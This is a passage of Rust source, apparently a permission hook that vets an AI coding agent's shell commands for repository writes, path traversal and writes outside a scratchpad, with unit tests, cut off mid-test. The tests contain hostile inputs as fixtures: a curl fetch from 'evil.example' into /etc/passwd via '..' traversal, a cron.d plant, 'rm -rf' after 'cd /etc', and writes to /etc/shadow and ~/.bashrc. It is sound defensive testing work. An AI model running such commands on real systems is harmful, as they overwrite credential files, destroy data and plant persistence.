/// - No `cd` tracking: `cd src && sed -i ... lib.rs` resolves `lib.rs`
///   against `cwd`, not `cwd/src`, and is not caught.
/// - An inline interpreter write primitive's ambiguity analysis is
///   narrowed to "does the code mention one of `cwd`'s own repo's allowed
///   roots" -- it does not attempt to prove a mentioned path is genuinely
///   outside that repo, or resolve which repo a DIFFERENT mentioned path
///   belongs to the way (a)-(c)/(e)'s structured targets do.
pub(crate) fn orchestrator_repo_write_target(
    command: &str,
    cwd: &str,
    repo_root_of: &dyn Fn(&str) -> Option<String>,
    env: EnvLookup<'_>,
) -> Option<String> {
    // (d)'s own approximation needs SOME allowed-roots list to check an
    // inline interpreter's code text against, but has no structured target
    // path to resolve a repo for -- `cwd` itself may already be the repo
    // root, and a bare trailing `.` is lexically stripped by `Path::parent`
    // (landing one level too high), so a synthetic nested leaf is probed
    // instead of `cwd` directly, making `repo_root_of`'s own "starts at the
    // parent" contract land exactly on `cwd`.
    let cwd_allowed_roots: Vec<String> = repo_root_of(&format!("{cwd}/__zirv_cwd_probe__"))
        .into_iter()
        .flat_map(|root| [format!("{root}/.zirv/work"), format!("{root}/.zirv/memory")])
        .collect();

    let sanitized = redact_single_quoted_heredocs(command);
    // Whether the immediately preceding segment was itself a `git`
    // invocation whose action is one of `GIT_DIFF_PRODUCING_ACTIONS` --
    // the only kind of upstream a piped `git apply`/`git am` may be exempt
    // for. Reset to `false` at the top of every iteration this loop
    // doesn't explicitly set it in, so it only ever reflects the segment
    // immediately before the one currently being examined.
    let mut previous_diff_producing_git = false;
    for (segment, preceded_by_pipe) in split_segments_with_pipe_marker(&sanitized) {
        let collapsed = collapse_whitespace(&segment);
        let Some(tokens) = sql_tokens(&collapsed) else {
            previous_diff_producing_git = false;
            continue;
        };
        let Some(first) = tokens.first() else {
            previous_diff_producing_git = false;
            continue;
        };
        let program = sql_program_name(first);

        // Issue #334 review round 2, HIGH: the real git action, skipping
        // any global option ahead of the verb -- `tokens.get(1)` alone
        // would read `-C`/`-c`/`--git-dir=.../--work-tree=.../--namespace=`
        // as the verb and let an actual `apply`/`am` slip past both checks
        // below via the blanket `git` exemption.
        if program == "git" {
            let action = git_action(&tokens).map(|(_, action)| action.to_ascii_lowercase());
            if let Some(label) = git_apply_program_label(&program, action.as_deref()) {
                let exempt = preceded_by_pipe && previous_diff_producing_git;
                previous_diff_producing_git = false;
                if exempt {
                    continue;
                }
                return Some(label.to_string());
            }
            previous_diff_producing_git = action
                .as_deref()
                .is_some_and(|action| GIT_DIFF_PRODUCING_ACTIONS.contains(&action));
            continue;
        }

        if let Some(label) = git_apply_program_label(&program, None) {
            let exempt = preceded_by_pipe && previous_diff_producing_git;
            previous_diff_producing_git = false;
            if exempt {
                continue;
            }
            return Some(label.to_string());
        }
        previous_diff_producing_git = false;

        if let Some(targets) = segment_write_targets(&neutralize_heredoc_operator(&segment)) {
            for target in &targets {
                if let Some(hit) = repo_write_violation(target, cwd, repo_root_of, env) {
                    return Some(hit);
                }
            }
        }

        if matches!(program.as_str(), "sed" | "perl")
            && tokens[1..].iter().any(|t| is_sed_perl_inplace_flag(t))
        {
            for target in sed_perl_inplace_targets(&program, &tokens) {
                if let Some(hit) = repo_write_violation(&target, cwd, repo_root_of, env) {
                    return Some(hit);
                }
            }
        }

        if matches!(program.as_str(), "cp" | "mv" | "install" | "rsync" | "ln")
            && let Some(target) = last_non_flag_argument(&tokens)
            && let Some(hit) = repo_write_violation(target, cwd, repo_root_of, env)
        {
            return Some(hit);
        }

        if matches!(
            program.as_str(),
            "python" | "python3" | "node" | "ruby" | "perl" | "php"
        ) && let Some(code) = inline_interpreter_code(&tokens)
            && inline_code_has_write_primitive(code)
            && !cwd_allowed_roots
                .iter()
                .any(|root| code.contains(root.as_str()))
        {
            return Some("<inline interpreter write>".to_string());
        }
    }
    None
}

/// Issue #168, design decision (d): true when every one of `command`'s
/// normalized executable candidates evaluates to `Allow`, or to the plain,
/// no-rule-matched mode default -- the check [`write_targets_confined`]'s
/// caller needs before it will widen a compound's default `Ask` to `Allow`:
/// an explicit operator/repo `ask` rule, or any `deny` rule, naming one
/// segment must still win, never be silently overridden just because that
/// segment also happens to write somewhere confined.
pub(super) fn every_segment_is_allow_or_unmatched_default(
    policy: &SafetyPolicy,
    command: &str,
    fallback: Verdict,
    scratchpad_roots: &[String],
) -> bool {
    let candidates = normalize_segments(command);
    if candidates.is_empty() {
        return false;
    }
    candidates.iter().all(|candidate| {
        let outcome =
            evaluate_candidate_outcome(policy, candidate, command, fallback, scratchpad_roots);
        outcome.verdict == Verdict::Allow
            || (outcome.verdict == fallback && outcome.matched.is_none())
    })
}

#[cfg(test)]
mod tests {
    use super::super::tests::*;
    use super::*;

    // -- strip_known_root_cd_prefix (issue #168, decision e) --------------

    #[test]
    fn cd_prefix_strips_a_known_worktree_or_scratchpad_root() {
        let roots = vec!["/repo".to_string(), "/tmp/claude".to_string()];
        assert_eq!(
            strip_known_root_cd_prefix("cd /repo && git log", &roots).as_deref(),
            Some("git log")
        );
        assert_eq!(
            strip_known_root_cd_prefix("cd /repo/sub && git log", &roots).as_deref(),
            Some("git log")
        );
        assert_eq!(
            strip_known_root_cd_prefix("cd /tmp/claude/out; ls", &roots).as_deref(),
            Some("ls")
        );
        assert_eq!(
            strip_known_root_cd_prefix("cd /anywhere/.claude/worktrees/feat && cargo fmt", &roots)
                .as_deref(),
            Some("cargo fmt")
        );
    }

    #[test]
    fn cd_prefix_leaves_unknown_or_dynamic_paths_untouched() {
        let roots = vec!["/repo".to_string()];
        for command in [
            "cd /etc && rm -rf .",
            "cd $HOME/evil && rm -rf .",
            "cd `pwd`/x && rm -rf .",
            "cd ~ && rm -rf .",
            "cd /repo",
            "cd /repo/../../etc && cat shadow",
        ] {
            assert!(
                strip_known_root_cd_prefix(command, &roots).is_none(),
                "{command} must not be stripped"
            );
        }
    }

    #[test]
    fn a_cd_into_the_process_working_directory_then_git_log_allows_headlessly() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let cwd = std::env::current_dir()
            .expect("cwd")
            .to_string_lossy()
            .replace('\\', "/");
        let command = format!("cd {cwd} && git log");
        let stdin = format!(
            r#"{{"tool_name":"Bash","tool_input":{{"command":"{command}"}},"permission_mode":"dontAsk"}}"#
        );
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            !text.contains(r#""permissionDecision":"ask""#) && !text.contains("deny"),
            "cd into the process cwd then a plain git log must classify by git log alone: got {text}"
        );
    }

    #[test]
    fn a_cd_into_an_unknown_root_then_a_destructive_command_still_escalates() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        // "default" (interactive-ish) rather than "dontAsk": an `Ask`
        // verdict under `dontAsk` is deliberately silent (no output at all
        // -- pre-existing, unrelated to this task, see `hook_output`'s own
        // doc comment on `Verdict::Ask if dont_ask => return None`), so
        // "default" is what lets this test observe the escalation as
        // explicit text rather than mere silence that could mean anything.
        let stdin = r#"{"tool_name":"Bash","tool_input":{"command":"cd /etc && rm -rf ."},"permission_mode":"default"}"#;
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(r#""permissionDecision":"ask""#),
            "an unknown-root cd ahead of rm -rf must still ask: got {text}"
        );
    }

    // -- target_is_confined (code review fix, CRITICAL) --------------------

    /// `target_is_confined` used to gate confinement on a plain `starts_
    /// with`, so a SIBLING directory whose name merely shares the root's
    /// text as a prefix (`/tmp/claude-evil`) was wrongly treated as beneath
    /// `/tmp/claude`. Must require the exact root, or the root followed by a
    /// path separator -- the same boundary guard `strip_known_root_cd_
    /// prefix` already applies to its own root comparison.
    #[test]
    fn target_is_confined_rejects_a_sibling_prefix_path() {
        let roots = vec!["/tmp/claude".to_string()];
        assert!(
            !target_is_confined("/tmp/claude-evil/x", &roots),
            "a sibling directory must never be treated as confined"
        );
        assert!(
            !target_is_confined("/tmp/claude-evil", &roots),
            "a sibling directory (no trailing component) must never be treated as confined"
        );
        // The exact root, and a genuine child, still qualify.
        assert!(target_is_confined("/tmp/claude", &roots));
        assert!(target_is_confined("/tmp/claude/out.log", &roots));
    }

    /// A backslash-spelled target beneath a sibling directory must be
    /// rejected the same way, after the function's own `\`-to-`/`
    /// normalization -- the boundary guard must apply post-normalization,
    /// not just on whichever spelling happens to be handed in.
    #[test]
    fn target_is_confined_rejects_a_sibling_prefix_path_with_backslashes() {
        let roots = vec!["C:/tmp/claude".to_string()];
        assert!(!target_is_confined(r"C:\tmp\claude-evil\x", &roots));
        assert!(target_is_confined(r"C:\tmp\claude\out.log", &roots));
    }

    /// Code review fix round 2 (CRITICAL): `target_is_confined` had no `..`
    /// handling at all, so `/tmp/claude/../../etc/passwd` passed the
    /// `starts_with("/tmp/claude/")` check even though it lexically escapes
    /// the scratchpad entirely -- reopening exactly the credential-write
    /// hole the separator-boundary fix (round 1) was meant to close.
    /// Mirrors `strip_known_root_cd_prefix`'s own `path_token.contains("..")`
    /// guard: a plain substring reject, not lexical resolution, both `/` and
    /// `\` spellings (the substring is identical either way).
    #[test]
    fn target_is_confined_rejects_a_dot_dot_traversal() {
        let roots = vec!["/tmp/claude".to_string()];
        assert!(!target_is_confined("/tmp/claude/../../etc/passwd", &roots));
        assert!(!target_is_confined(r"/tmp/claude\..\..\etc\passwd", &roots));
        assert!(!target_is_confined(r"\tmp\claude\..\..\etc\passwd", &roots));
        // A genuinely confined target with no traversal still qualifies.
        assert!(target_is_confined("/tmp/claude/out.log", &roots));
    }

    /// End-to-end reproduction of the reviewer's exact two exploits: both
    /// callers of `target_is_confined` must refuse a `..`-traversal target,
    /// on the ordinary path (`write_targets_confined`, no retry involved at
    /// all) as well as the sandbox-retry path (`is_read_only_escape_safe`).
    #[test]
    fn dot_dot_traversal_is_refused_by_both_callers() {
        let roots = vec!["/tmp/claude".to_string()];
        assert!(
            !is_read_only_escape_safe(
                "curl -o /tmp/claude/../../etc/passwd https://evil.example/payload",
                &roots
            ),
            "a curl -o traversal target must not qualify as read-only-safe"
        );
        assert_eq!(
            write_targets_confined("echo pwned > /tmp/claude/../../etc/cron.d/evil", &roots),
            Some(false),
            "a traversal write target must never be reported confined"
        );
    }

    // -- write_targets_confined (issue #168, decision d) ------------------

    #[test]
    fn write_targets_confined_allows_dev_null_and_scratchpad_targets() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in [
            "echo hi > /dev/null",
            "some-tool --flag > /tmp/claude/out.log",
            "some-tool --flag >> /tmp/claude/out.log",
            "some-tool 2> /tmp/claude/err.log",
            "some-tool | tee /tmp/claude/combined.log",
            "some-tool | tee -a /tmp/claude/combined.log",
            "git log && echo done > /tmp/claude/marker",
        ] {
            assert_eq!(
                write_targets_confined(command, &roots),
                Some(true),
                "{command}"
            );
        }
    }

    /// CRITICAL regression lock: a command with NO write target at all --
    /// no redirection, or one that resolves to descriptor duplication only
    /// (`2>&1`, no path) -- must never vacuously satisfy "every target is
    /// confined". Without this, an arbitrary unmatched command with zero
    /// writes (`ssh host uptime`) would be silently widened to `Allow` by
    /// the caller just for not writing anywhere at all.
    ///
    /// `kubectl exec -it pod -- sh` was this test's example until the
    /// `docker exec`/`kubectl exec` decoder (`unwrap_exec_prefix`) started
    /// analysing the inner command instead of treating the whole invocation
    /// as opaque -- it is no longer a stable "unanalyzable" example (its
    /// analyzability is exactly what changed), so `ssh host uptime` (a
    /// different program this module still never looks inside) takes its
    /// place. `write_targets_confined` itself is unaffected either way: it
    /// scans `split_segments` directly and has no exec-decoding of its own,
    /// so its answer for the old example did not actually change -- this
    /// swap is about keeping the test's chosen example honest, not about a
    /// behavior change here.
    #[test]
    fn write_targets_confined_has_no_opinion_when_there_is_no_write_target_at_all() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in ["ssh host uptime", "some-tool 2>&1", "git log"] {
            assert_eq!(write_targets_confined(command, &roots), None, "{command}");
        }
    }

    #[test]
    fn write_targets_confined_rejects_targets_outside_the_scratchpad() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in [
            "echo hi > /etc/passwd",
            "some-tool >> ~/.bashrc",
            "some-tool | tee /etc/shadow",
        ] {
            assert_eq!(
                write_targets_confined(command, &roots),
                Some(false),
                "{command}"
            );
        }
    }

    #[test]
    fn write_targets_confined_has_no_opinion_on_unparseable_targets() {
        let roots = vec!["/tmp/claude".to_string()];
        for command in ["some-tool > $OUT", "some-tool > \"$(mktemp)\""] {
            assert_eq!(write_targets_confined(command, &roots), None, "{command}");
        }
    }

    #[test]
    fn write_targets_confined_returns_none_with_no_scratchpad_roots_configured() {
        assert_eq!(write_targets_confined("echo hi > /dev/null", &[]), None);
    }

    #[test]
    fn orchestrator_repo_write_target_catches_repository_writes() {
        let cwd = "/work/repo";
        for command in [
            "sed -i 's/a/b/' src/main.rs",
            "sed -i.bak -e 's/a/b/' src/main.rs",
            "perl -pi -e 's/a/b/' Cargo.toml",
            "echo x > src/lib.rs",
            "echo x >> /work/repo/README.md",
            "cat > README.md <<'EOF'\nhi\nEOF",
            "some | tee src/x.rs",
            "cp /tmp/claude-501/x src/y.rs",
            "mv a.txt docs/b.txt",
            "python3 -c \"open('src/x.py','w').write('a')\"",
            "node -e \"require('fs').writeFileSync('src/x.js','a')\"",
            // Issue #334 review fix: `git apply`/`git am`/`patch` are
            // never exempt on program name alone -- they apply an
            // arbitrary diff, which can write anywhere.
            "git apply p.diff",
            "git apply - <<'EOF'\nx\nEOF",
            "git am 0001.patch",
            "patch -p1 < .zirv/work/p.diff",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_only_reports_path_output_redirections() {
        let cwd = "/work/repo";
        for (command, target) in [
            ("echo x > src/x.rs", "src/x.rs"),
            ("cat > README.md", "README.md"),
            ("cmd 2> src/err.log", "src/err.log"),
            ("cmd &> out.txt", "out.txt"),
            ("cmd >& legacy.txt", "legacy.txt"),
            ("cmd >&src/legacy.log", "src/legacy.log"),
            ("cmd >> src/out.log", "src/out.log"),
            ("cmd >| src/out.log", "src/out.log"),
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                Some(target.to_string()),
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_ignores_input_and_descriptor_redirections() {
        let cwd = "/work/repo";
        for command in [
            "zirv agent codex --workdir /x/wt338 - < /private/tmp/claude-501/session/scratchpad/brief-338.md",
            "cat < README.md",
            "cmd 2>&1 | grep x",
            "cmd >&2",
            "cmd >& 2",
            "cmd 2>& 1",
            "cmd 2>& -",
            "cat <<'EOF'\nhello\nEOF",
            "diff <(a) <(b)",
            "for i in $(seq 1 80); do s=$(zirv ctx status --brief 2>&1); if echo \"$s\" | grep -qE 'x'; then echo READY; exit 0; fi; sleep 30; done",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_scans_command_substitutions_for_real_writes() {
        let cwd = "/work/repo";
        for (command, target) in [
            ("echo $(cmd > src/substitution.log)", "src/substitution.log"),
            ("echo `cmd > src/backtick.log`", "src/backtick.log"),
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                Some(target.to_string()),
                "{command}"
            );
        }
    }

    #[test]
    fn orchestrator_repo_write_target_has_no_opinion_on_non_repository_writes() {
        let cwd = "/work/repo";
        for command in [
            "echo x > .zirv/work/notes.md",
            "echo x > /work/repo/.zirv/memory/m.md",
            "echo x > /tmp/claude-501/s/out.md",
            "echo x > /dev/null",
            "git commit -m x",
            "git checkout -- src/x.rs",
            "cargo build",
            "cargo fmt -- --check",
            "sed 's/a/b/' src/main.rs",
            "sed -n '1,5p' src/main.rs",
            "cat src/main.rs",
            "echo x > \"$TMPDIR/x\"",
            "echo x > $OUT",
            "mkdir -p .zirv/work/x && gh issue view 1 > .zirv/work/x/i.md",
            "python3 -c \"print(open('src/x.py').read())\"",
            "python3 -c \"open('/work/repo/.zirv/work/o.txt','w').write('a')\"",
            "cp src/a.rs /tmp/claude-501/s/a.rs",
            "echo x > ~/notes.md",
            "echo x > ../outside.txt",
            // Issue #334 review fix: `git apply`/`git am` piped straight
            // from a `git` upstream is how the seat integrates a worker's
            // diff, and stays exempt.
            "git -C /w diff | git apply",
            "git diff main | git apply -",
            "git format-patch --stdout | git am",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// Issue #334 review round 2, HIGH: a git global option ahead of the
    /// verb (`-C <dir>`, `-c k=v`, `--git-dir=`) must not defeat detection
    /// by being mistaken for the verb itself -- the real action comes from
    /// `git_action`, not a raw second token, exactly for the sibling-
    /// worktree shape this bug let through (`git -C <sibling> apply
    /// p.diff` used to read `-C` as the verb and fall through to the
    /// blanket `git` exemption).
    #[test]
    fn orchestrator_repo_write_target_sees_through_git_global_options_before_apply() {
        let cwd = "/work/repo";
        for command in [
            "git -C /work/sibling apply p.diff",
            "git -c core.autocrlf=false apply p.diff",
            "git --git-dir=/work/repo/.git apply p.diff",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
        for command in [
            "git -C /work/wt diff | git apply",
            "git -C /work/wt diff | git -C /work/repo apply",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// Issue #334 review round 2, MEDIUM: the pipe exemption is narrowed to
    /// an allowlist of diff-producing `git` actions -- an arbitrary `git`
    /// subcommand (`cat-file`, reading a blob rather than a diff) must not
    /// qualify as a safe upstream just because it is *some* `git` call, and
    /// a non-`git` upstream (`cat`) never qualifies either.
    #[test]
    fn orchestrator_repo_write_target_narrows_the_pipe_exemption_to_diff_producing_git_actions() {
        let cwd = "/work/repo";
        for command in [
            "git cat-file -p abc:p.diff | git apply",
            "cat p.diff | git apply",
        ] {
            assert!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None)
                    .is_some(),
                "{command}"
            );
        }
        for command in [
            "git show HEAD | git apply",
            "git diff-tree -p HEAD | git apply",
            "git log -p -1 | git apply",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// Issue #334, MAJOR review fix: the guard used to only know the
    /// launch repo's own root, so an absolute target in a SIBLING
    /// checkout/linked worktree of a different repository sailed through
    /// unrecognized. `repo_root_of` is now consulted per target, so a
    /// sibling repo's own file is caught even though it is nowhere near
    /// `cwd`.
    #[test]
    fn orchestrator_repo_write_target_catches_a_sibling_checkouts_own_files_too() {
        let cwd = "/work/repo";
        let command = "cp /tmp/claude-501/x /work/sibling/src/a.rs";
        assert_eq!(
            orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
            Some("/work/sibling/src/a.rs".to_string())
        );
    }

    /// The other half: a sibling repo's OWN `.zirv/work`/`.zirv/memory`
    /// still confines a write, exactly as the launch repo's own does --
    /// the allowed roots are resolved against WHICHEVER repo the target
    /// lands in, not hardcoded to the launch repo.
    #[test]
    fn orchestrator_repo_write_target_allows_a_sibling_checkouts_own_scratchpad() {
        let cwd = "/work/repo";
        for command in [
            "cp /tmp/claude-501/x /work/sibling/.zirv/work/o.txt",
            "echo x > /work/sibling/.zirv/memory/m.md",
        ] {
            assert_eq!(
                orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
                None,
                "{command}"
            );
        }
    }

    /// An absolute target that names no repository at all (per
    /// `repo_root_of`) is not a repository write -- there is no repo whose
    /// boundary it could be crossing.
    #[test]
    fn orchestrator_repo_write_target_allows_an_absolute_path_outside_any_known_repo() {
        let cwd = "/work/repo";
        let command = "cp /tmp/claude-501/x /elsewhere/not-a-repo/file.txt";
        assert_eq!(
            orchestrator_repo_write_target(command, cwd, &fake_repo_root_of, &|_| None),
            None
        );
    }

    /// `filesystem_repo_root_of` walks up from a target's PARENT (the
    /// target itself need not exist yet) until it finds a `.git` entry --
    /// here, two directories up.
    #[test]
    fn filesystem_repo_root_of_walks_up_to_the_nearest_git_marker() {
        let root = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(root.path().join(".git")).expect("git marker");
        let nested = root.path().join("src").join("nested");
        std::fs::create_dir_all(&nested).expect("mkdir nested");
        let target = nested.join("file.rs");
        let target_str = target.to_string_lossy().replace('\\', "/");

        let found = filesystem_repo_root_of(&target_str).expect("finds the repo root");
        let expected = root
            .path()
            .to_string_lossy()
            .replace('\\', "/")
            .trim_end_matches('/')
            .to_string();
        assert_eq!(found, expected);
    }

    #[test]
    fn a_scratchpad_confined_compound_allows_headlessly_even_unmatched() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = scratchpad_write_root(&std::env::temp_dir());
        let command = format!("some-totally-unknown-tool --flag > {scratchpad}/out.log");
        let stdin = format!(
            r#"{{"tool_name":"Bash","tool_input":{{"command":"{command}"}},"permission_mode":"dontAsk"}}"#
        );
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            !text.contains(r#""permissionDecision":"ask""#) && !text.contains("deny"),
            "a scratchpad-confined write from an otherwise-unmatched command must not prompt: got {text}"
        );
    }

    #[test]
    fn a_scratchpad_confined_compound_survives_an_unsandboxed_retry() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = scratchpad_write_root(&std::env::temp_dir());
        let command = format!("grep -r TODO . > {scratchpad}/todos.log");
        let stdin = format!(
            r#"{{"tool_name":"Bash","tool_input":{{"command":"{command}","dangerouslyDisableSandbox":true}},"permission_mode":"default"}}"#
        );
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(r#""permissionDecision":"allow""#),
            "got {text}"
        );
        assert!(!text.contains("unsandboxed retry"), "got {text}");
    }

    #[cfg(unix)]
    #[test]
    fn a_real_claude_scratchpad_write_allows_headlessly_even_unmatched() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = real_claude_scratchpad_root();
        let command =
            format!("some-unknown-tool --flag > {scratchpad}/enc/sess/scratchpad/out.log");
        let state = tempfile::tempdir().expect("state");
        let env = env_from(&[(
            super::super::state::STATE_ENV,
            state.path().to_str().expect("utf8 state"),
        )]);
        let stdin = serde_json::json!({
            "session_id": "real-scratchpad-write",
            "tool_name": "Bash",
            "tool_input": { "command": command },
            "permission_mode": "dontAsk"
        })
        .to_string();
        let mut out = Vec::new();
        run_check_hook_mode_with_env(&cfg, &mut out, &stdin, &|key| env.get(key).cloned())
            .expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(text.is_empty(), "got {text}");
        let audit_dir = state.path().join("logs/safety-decisions");
        let audit_path = std::fs::read_dir(audit_dir)
            .expect("audit dir")
            .next()
            .expect("one audit file")
            .expect("audit entry")
            .path();
        let audit = std::fs::read_to_string(audit_path).expect("audit");
        assert!(
            audit.contains(r#""verdict":"allow""#)
                && audit.contains("<scratchpad: confined write>"),
            "{audit}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_cd_into_a_real_claude_scratchpad_allows_an_unsandboxed_git_retry() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = real_claude_scratchpad_root();
        let command = format!("cd {scratchpad}/enc/sess/scratchpad/repo && git status --short");
        let stdin = serde_json::json!({
            "tool_name": "Bash",
            "tool_input": {
                "command": command,
                "dangerouslyDisableSandbox": true
            },
            "permission_mode": "default"
        })
        .to_string();
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(
            text.contains(r#""permissionDecision":"allow""#),
            "got {text}"
        );
        assert!(!text.contains("unsandboxed retry"), "got {text}");
    }

    #[cfg(unix)]
    #[test]
    fn a_confined_scratchpad_write_with_read_only_gh_survives_an_unsandboxed_retry() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        let scratchpad = real_claude_scratchpad_root();
        let command = format!(
            "mkdir -p {scratchpad}/enc/sess/scratchpad/issues && gh issue view 264 --repo o/r --json title,body > {scratchpad}/enc/sess/scratchpad/issues/TEMPLATE.md"
        );
        let stdin = serde_json::json!({
            "tool_name": "Bash",
            "tool_input": {
                "command": command,
                "dangerouslyDisableSandbox": true
            },
            "permission_mode": "default"
        })
        .to_string();
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, &stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(text.contains("<scratchpad: confined write>"), "got {text}");
        assert!(
            text.contains(r#""permissionDecision":"allow""#),
            "got {text}"
        );
    }

    #[test]
    fn a_write_outside_the_scratchpad_still_escalates_even_if_otherwise_unmatched() {
        let repo = tempfile::tempdir().expect("tempdir");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = super::super::testenv::HomeGuard::set(home.path());
        let empty: HashMap<String, String> = HashMap::new();
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("loads");

        // An empty mode is headless and still emits Ask; dontAsk would
        // suppress it, while auto now uses the interactive default.
        let stdin = r#"{"tool_name":"Bash","tool_input":{"command":"some-totally-unknown-tool > /etc/passwd"},"permission_mode":""}"#;
        let mut out = Vec::new();
        run_check_hook_mode(&cfg, &mut out, stdin).expect("runs");
        let text = String::from_utf8(out).expect("utf8");
        assert!(text.contains(r#""permissionDecision":"ask""#), "got {text}");
    }

    #[test]
    fn literal_assignment_scratchpad_writes_allow_sandboxed_and_on_retry() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for command in [
            format!(
                r#"S={scratch}/x; ZIRV_CTX_FALLBACK=false zirv agent codex - --workdir /tmp/wt -- --model gpt-6-astra < $S/r.md > $S/o.out 2> $S/e.err; echo "exit=$?"; cat $S/o.out"#
            ),
            format!(
                r#"LOGF="{scratch}/x/scratchpad/l.log"; cargo test > "$LOGF" 2>&1; tail -3 "$LOGF""#
            ),
            format!(
                r#"OUT="{scratch}/x/scratchpad/g"; WT="/work/wt-jev-tier"; cargo fmt --manifest-path "$WT/Cargo.toml" -- --check > "$OUT/01-fmt.log" 2>&1; echo "FMT_EXIT=$?" | tee -a "$OUT/exit-codes.txt""#
            ),
            format!(
                r#"export S='{scratch}/logs with ; spaces'; mkdir -p "$S"; echo ok | tee -a "${{S}}/out""#
            ),
        ] {
            for retry in [false, true] {
                let output = literal_retry_hook(&command, retry, "/work/repo");
                assert_eq!(output["permissionDecision"], "allow", "{command}: {output}");
                assert!(
                    output["permissionDecisionReason"]
                        .as_str()
                        .unwrap()
                        .contains("<scratchpad: confined write>"),
                    "{command}: {output}"
                );
            }
        }
    }

    #[test]
    fn tee_and_mkdir_do_not_treat_redirect_operands_as_path_arguments() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for command in [
            format!(r#"S={scratch}/x; tee -a "$S/out" < /tmp/input 2>"$S/errors""#),
            format!(r#"S={scratch}/x; mkdir -p "$S/new" 0</tmp/input > "$S/log""#),
        ] {
            let output = literal_retry_hook(&command, true, "/work/repo");
            assert_eq!(output["permissionDecision"], "allow", "{command}: {output}");
            assert!(
                output["permissionDecisionReason"]
                    .as_str()
                    .unwrap()
                    .contains("<scratchpad: confined write>"),
                "{output}"
            );
        }
        assert_eq!(
            segment_redirect_targets("tee '>unconfined' < /tmp/input"),
            Some(vec![">unconfined".to_string()])
        );
    }

    #[test]
    fn literal_assignment_retry_keeps_unconfined_tainted_and_credential_targets_blocked() {
        let scratch = scratchpad_write_root(&std::env::temp_dir());
        for command in [
            "S=/etc; echo x > $S/passwd".to_string(),
